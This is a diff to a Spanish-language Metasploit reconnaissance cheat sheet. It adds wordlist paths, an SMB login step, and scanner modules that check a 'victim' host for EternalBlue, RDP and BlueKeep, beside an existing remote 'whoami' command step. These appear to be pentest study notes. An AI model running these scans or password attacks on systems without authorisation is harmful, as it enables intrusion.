@@ -1,6 +1,6 @@
 # Reconocimiento con Metasploit
 
-Tags: #Metasploit 
+Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL 
 
 
 ## Puerto 445 SMB 
@@ -62,6 +62,8 @@ Tags: #Metasploit
 
 # Diccionarios 
 /usr/share/wordlists/metasploit/unix_passwords.txt
+/usr/share/metasploit-framework/data/wordlists/common_users.txt
+/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
 ```
 
 ```bash 
@@ -72,6 +74,18 @@ Tags: #Metasploit
 	❯ options
 	❯ set smbuser <admin>
 	❯ set smbpass <passwd>
+	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
+	❯ run 
+```
+
+## EternalBlue (CVE-2017-0144)
+
+```bash 
+# Para ver si el Windows en vulnerable al EternalBlue
+❯ msfconsole -q                                    # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/smb/smb_ms17_010      # Usamos el auxiliar
+	❯ options
 	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
 	❯ run 
 ```
@@ -248,4 +262,31 @@ Tags: #Metasploit
 	❯ set RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
 	❯ set cmd whoami                                        # Colocamos el comando a ejecutar 
 	❯ run
+```
+
+## Puerto 3389/33333 RDP
+
+```bash 
+# Identifica si el 'endpoint' esta usando RDP
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/rdp/rdp_scanner        # Usamos el auxiliar 
+	❯ options
+	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
+	❯ set RPORT 3333                               # Configuramos el puerto de RDP en caso que no use el de default 3389
+	❯ run 
+```
+
+## BlueKeep (CVE-2019-0708)
+
+* Servicio 'ms-wbt-server'
+
+```bash 
+# Identifica si la maquina victima es vulnerable al BlueKeep
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/rdp/cve_2019_0708_bluekeep        # Usamos el auxiliar 
+	❯ options
+	❯ set RHOSTS 192.168.1.194                                # Colocamos la IP de la maquina victima
+	❯ run 
 ```
